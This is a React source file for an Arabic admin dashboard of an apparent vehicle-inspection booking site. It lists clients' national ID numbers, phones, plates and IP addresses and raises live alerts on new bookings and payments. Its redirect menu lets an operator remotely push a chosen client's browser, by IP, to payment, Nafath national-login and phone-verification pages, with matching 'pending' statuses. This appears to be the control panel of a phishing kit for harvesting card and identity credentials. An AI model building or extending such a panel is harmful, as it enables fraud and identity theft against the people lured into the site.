import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { toast } from "sonner";
import {
  Car,
  Users,
  CheckCircle,
  Clock,
  LogOut,
  RefreshCw,
  Eye,
  Navigation,
  CreditCard,
  Smartphone,
  Phone,
  Search,
  Bell,
  ChevronDown,
  Trash2,
} from "lucide-react";
import { io as socketIO } from "socket.io-client";

type Booking = {
  id: number;
  referenceId: string;
  clientName: string;
  clientId: string;
  clientPhone: string;
  vehiclePlate: string;
  serviceRegion: string;
  serviceDate: string;
  status: string;
  clientIp: string | null;
  createdAt: Date;
};

const STATUS_LABELS: Record<string, { label: string; color: string }> = {
  new: { label: "جديد", color: "bg-blue-100 text-blue-700" },
  pending_payment: { label: "انتظار دفع", color: "bg-yellow-100 text-yellow-700" },
  pending_nafath: { label: "انتظار نفاذ", color: "bg-purple-100 text-purple-700" },
  pending_motasel: { label: "انتظار متصل", color: "bg-orange-100 text-orange-700" },
  payment_done: { label: "تم الدفع", color: "bg-green-100 text-green-700" },
  verified: { label: "تم التحقق", color: "bg-emerald-100 text-emerald-700" },
  completed: { label: "مكتمل", color: "bg-gray-100 text-gray-700" },
  cancelled: { label: "ملغي", color: "bg-red-100 text-red-700" },
};

export default function AdminDashboard() {
  const [, navigate] = useLocation();
  const { user, loading, isAuthenticated, logout } = useAuth();
  const [search, setSearch] = useState("");
  const [navigateDialog, setNavigateDialog] = useState<{
    open: boolean;
    booking: Booking | null;
  }>({ open: false, booking: null });
  const [newBookingsCount, setNewBookingsCount] = useState(0);
  const socketRef = useRef<ReturnType<typeof socketIO> | null>(null);

  // Auth check
  useEffect(() => {
    if (!loading && (!isAuthenticated || user?.role !== "admin")) {
      navigate("/admin/login");
    }
  }, [loading, isAuthenticated, user]);

  // Socket.io connection
  useEffect(() => {
    const socket = socketIO({ path: "/api/socket.io" });
    socketRef.current = socket;
    socket.emit("joinAdmin", "admin-token");

    socket.on("newBooking", (booking: Booking) => {
      toast.success(`حجز جديد من ${booking.clientName}`, {
        description: `رقم الهوية: ${booking.clientId} | اللوحة: ${booking.vehiclePlate}`,
      });
      setNewBookingsCount((c) => c + 1);
      refetchBookings();
    });

    socket.on("newPayment", (data: { reference: string }) => {
      toast.info(`دفع جديد - المرجع: ${data.reference}`);
      refetchBookings();
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  // Data fetching
  const { data: statsData } = trpc.booking.stats.useQuery();
  const {
    data: bookingsData,
    refetch: refetchBookings,
    isLoading,
  } = trpc.booking.list.useQuery({ limit: 200 });

  const navigateMutation = trpc.navigation.navigateTo.useMutation({
    onSuccess: (res) => {
      toast.success(res.message);
      setNavigateDialog({ open: false, booking: null });
    },
    onError: (err) => toast.error(err.message),
  });

  const updateStatusMutation = trpc.booking.updateStatus.useMutation({
    onSuccess: () => {
      toast.success("تم تحديث الحالة");
      refetchBookings();
    },
  });

  const markReadMutation = trpc.booking.markRead.useMutation({
    onSuccess: () => refetchBookings(),
  });

  const stats = statsData?.data;
  const bookings: Booking[] = (bookingsData?.data as Booking[]) || [];

  const filtered = bookings.filter(
    (b) =>
      b.clientName?.toLowerCase().includes(search.toLowerCase()) ||
      b.clientId?.includes(search) ||
      b.vehiclePlate?.toLowerCase().includes(search.toLowerCase()) ||
      b.referenceId?.includes(search)
  );

  const handleNavigate = (booking: Booking, page: string) => {
    if (!booking.clientIp) {
      toast.error("لا يوجد IP للعميل");
      return;
    }
    navigateMutation.mutate({
      clientIp: booking.clientIp,
      page,
      referenceId: booking.referenceId,
    });
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-30 shadow-sm">
        <div className="max-w-screen-xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-blue-600 rounded-lg flex items-center justify-center">
              <Car className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="font-bold text-slate-800 text-sm">نظام الفحص الفني</h1>
              <p className="text-xs text-slate-500">لوحة التحكم</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="sm"
              className="relative"
              onClick={() => {
                setNewBookingsCount(0);
                refetchBookings();
              }}
            >
              <Bell className="w-5 h-5 text-slate-600" />
              {newBookingsCount > 0 && (
                <span className="absolute -top-1 -right-1 w-5 h-5 bg-red-500 text-white text-xs rounded-full flex items-center justify-center">
                  {newBookingsCount}
                </span>
              )}
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => refetchBookings()}
            >
              <RefreshCw className="w-4 h-4 text-slate-600" />
            </Button>
            <div className="flex items-center gap-2 text-sm text-slate-600">
              <span>{user?.name || "المسؤول"}</span>
            </div>
            <Button
              variant="outline"
              size="sm"
              onClick={() => {
                logout();
                navigate("/admin/login");
              }}
              className="text-red-600 border-red-200 hover:bg-red-50"
            >
              <LogOut className="w-4 h-4 ml-1" />
              خروج
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-screen-xl mx-auto px-4 py-6">
        {/* Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
          <Card className="border-0 shadow-sm">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-slate-500">إجمالي الحجوزات</p>
                  <p className="text-2xl font-bold text-slate-800">{stats?.total ?? 0}</p>
                </div>
                <div className="w-10 h-10 bg-blue-50 rounded-lg flex items-center justify-center">
                  <Users className="w-5 h-5 text-blue-600" />
                </div>
              </div>
            </CardContent>
          </Card>
          <Card className="border-0 shadow-sm">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-slate-500">حجوزات جديدة</p>
                  <p className="text-2xl font-bold text-blue-600">{stats?.new ?? 0}</p>
                </div>
                <div className="w-10 h-10 bg-blue-50 rounded-lg flex items-center justify-center">
                  <Bell className="w-5 h-5 text-blue-600" />
                </div>
              </div>
            </CardContent>
          </Card>
          <Card className="border-0 shadow-sm">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-slate-500">مكتملة</p>
                  <p className="text-2xl font-bold text-green-600">{stats?.completed ?? 0}</p>
                </div>
                <div className="w-10 h-10 bg-green-50 rounded-lg flex items-center justify-center">
                  <CheckCircle className="w-5 h-5 text-green-600" />
                </div>
              </div>
            </CardContent>
          </Card>
          <Card className="border-0 shadow-sm">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-slate-500">قيد المعالجة</p>
                  <p className="text-2xl font-bold text-yellow-600">
                    {(stats?.total ?? 0) - (stats?.completed ?? 0) - (stats?.new ?? 0)}
                  </p>
                </div>
                <div className="w-10 h-10 bg-yellow-50 rounded-lg flex items-center justify-center">
                  <Clock className="w-5 h-5 text-yellow-600" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Bookings Table */}
        <Card className="border-0 shadow-sm">
          <CardHeader className="pb-3">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <CardTitle className="text-base font-semibold text-slate-800">
                قائمة الحجوزات
              </CardTitle>
              <div className="relative w-64">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
                <Input
                  placeholder="بحث بالاسم أو الهوية أو اللوحة..."
                  className="pr-9 text-sm h-9"
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                />
              </div>
            </div>
          </CardHeader>
          <CardContent className="p-0">
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="bg-slate-50">
                    <TableHead className="text-right text-xs font-semibold text-slate-600 pr-4">
                      المرجع
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600">
                      الاسم
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600">
                      رقم الهوية
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600">
                      رقم اللوحة
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600">
                      الهاتف
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600">
                      المنطقة
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600">
                      الحالة
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600">
                      التاريخ
                    </TableHead>
                    <TableHead className="text-right text-xs font-semibold text-slate-600 pl-4">
                      الإجراءات
                    </TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {isLoading ? (
                    <TableRow>
                      <TableCell colSpan={9} className="text-center py-10 text-slate-400">
                        <div className="flex items-center justify-center gap-2">
                          <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-blue-600" />
                          جاري التحميل...
                        </div>
                      </TableCell>
                    </TableRow>
                  ) : filtered.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={9} className="text-center py-10 text-slate-400">
                        لا توجد حجوزات
                      </TableCell>
                    </TableRow>
                  ) : (
                    filtered.map((booking) => {
                      const statusInfo = STATUS_LABELS[booking.status] || {
                        label: booking.status,
                        color: "bg-gray-100 text-gray-700",
                      };
                      return (
                        <TableRow
                          key={booking.id}
                          className="hover:bg-slate-50 cursor-pointer"
                          onClick={() => {
                            markReadMutation.mutate({ reference: booking.referenceId });
                            navigate(`/admin/booking/${booking.referenceId}`);
                          }}
                        >
                          <TableCell className="pr-4 py-3">
                            <span className="font-mono text-xs text-slate-500">
                              {booking.referenceId}
                            </span>
                          </TableCell>
                          <TableCell className="py-3">
                            <span className="font-medium text-slate-800 text-sm">
                              {booking.clientName}
                            </span>
                          </TableCell>
                          <TableCell className="py-3">
                            <span className="text-sm text-slate-600">{booking.clientId}</span>
                          </TableCell>
                          <TableCell className="py-3">
                            <span className="font-mono text-sm text-slate-700 bg-slate-100 px-2 py-0.5 rounded">
                              {booking.vehiclePlate || "—"}
                            </span>
                          </TableCell>
                          <TableCell className="py-3">
                            <span className="text-sm text-slate-600">{booking.clientPhone}</span>
                          </TableCell>
                          <TableCell className="py-3">
                            <span className="text-sm text-slate-600">
                              {booking.serviceRegion || "—"}
                            </span>
                          </TableCell>
                          <TableCell className="py-3">
                            <span
                              className={`text-xs px-2 py-1 rounded-full font-medium ${statusInfo.color}`}
                            >
                              {statusInfo.label}
                            </span>
                          </TableCell>
                          <TableCell className="py-3">
                            <span className="text-xs text-slate-500">
                              {new Date(booking.createdAt).toLocaleDateString("ar-SA")}
                            </span>
                          </TableCell>
                          <TableCell className="py-3 pl-4" onClick={(e) => e.stopPropagation()}>
                            <div className="flex items-center gap-1">
                              {/* زر التوجيه */}
                              <DropdownMenu>
                                <DropdownMenuTrigger asChild>
                                  <Button
                                    size="sm"
                                    className="h-7 px-2 bg-blue-600 hover:bg-blue-700 text-white text-xs"
                                  >
                                    <Navigation className="w-3 h-3 ml-1" />
                                    توجيه
                                    <ChevronDown className="w-3 h-3 mr-1" />
                                  </Button>
                                </DropdownMenuTrigger>
                                <DropdownMenuContent align="end" className="w-48">
                                  <DropdownMenuItem
                                    onClick={() => handleNavigate(booking, "/payment")}
                                    className="text-sm gap-2"
                                  >
                                    <CreditCard className="w-4 h-4 text-green-600" />
                                    صفحة الدفع
                                  </DropdownMenuItem>
                                  <DropdownMenuItem
                                    onClick={() => handleNavigate(booking, "/nafath")}
                                    className="text-sm gap-2"
                                  >
                                    <Smartphone className="w-4 h-4 text-purple-600" />
                                    صفحة نفاذ
                                  </DropdownMenuItem>
                                  <DropdownMenuItem
                                    onClick={() => handleNavigate(booking, "/motasel")}
                                    className="text-sm gap-2"
                                  >
                                    <Phone className="w-4 h-4 text-orange-600" />
                                    صفحة المتصل
                                  </DropdownMenuItem>
                                  <DropdownMenuItem
                                    onClick={() => handleNavigate(booking, "/booking")}
                                    className="text-sm gap-2"
                                  >
                                    <Car className="w-4 h-4 text-blue-600" />
                                    صفحة الحجز
                                  </DropdownMenuItem>
                                  <DropdownMenuItem
                                    onClick={() => handleNavigate(booking, "/")}
                                    className="text-sm gap-2"
                                  >
                                    <Navigation className="w-4 h-4 text-slate-600" />
                                    الصفحة الرئيسية
                                  </DropdownMenuItem>
                                </DropdownMenuContent>
                              </DropdownMenu>

                              {/* زر التفاصيل */}
                              <Button
                                size="sm"
                                variant="outline"
                                className="h-7 px-2 text-xs"
                                onClick={() => navigate(`/admin/booking/${booking.referenceId}`)}
                              >
                                <Eye className="w-3 h-3" />
                              </Button>

                              {/* زر تغيير الحالة */}
                              <DropdownMenu>
                                <DropdownMenuTrigger asChild>
                                  <Button
                                    size="sm"
                                    variant="outline"
                                    className="h-7 px-2 text-xs"
                                  >
                                    <ChevronDown className="w-3 h-3" />
                                  </Button>
                                </DropdownMenuTrigger>
                                <DropdownMenuContent align="end" className="w-40">
                                  <DropdownMenuItem
                                    onClick={() =>
                                      updateStatusMutation.mutate({
                                        reference: booking.referenceId,
                                        status: "completed",
                                        statusRead: 1,
                                      })
                                    }
                                    className="text-sm text-green-600"
                                  >
                                    <CheckCircle className="w-4 h-4 ml-2" />
                                    مكتمل
                                  </DropdownMenuItem>
                                  <DropdownMenuItem
                                    onClick={() =>
                                      updateStatusMutation.mutate({
                                        reference: booking.referenceId,
                                        status: "cancelled",
                                        statusRead: 1,
                                      })
                                    }
                                    className="text-sm text-red-600"
                                  >
                                    <Trash2 className="w-4 h-4 ml-2" />
                                    إلغاء
                                  </DropdownMenuItem>
                                </DropdownMenuContent>
                              </DropdownMenu>
                            </div>
                          </TableCell>
                        </TableRow>
                      );
                    })
                  )}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  );
}
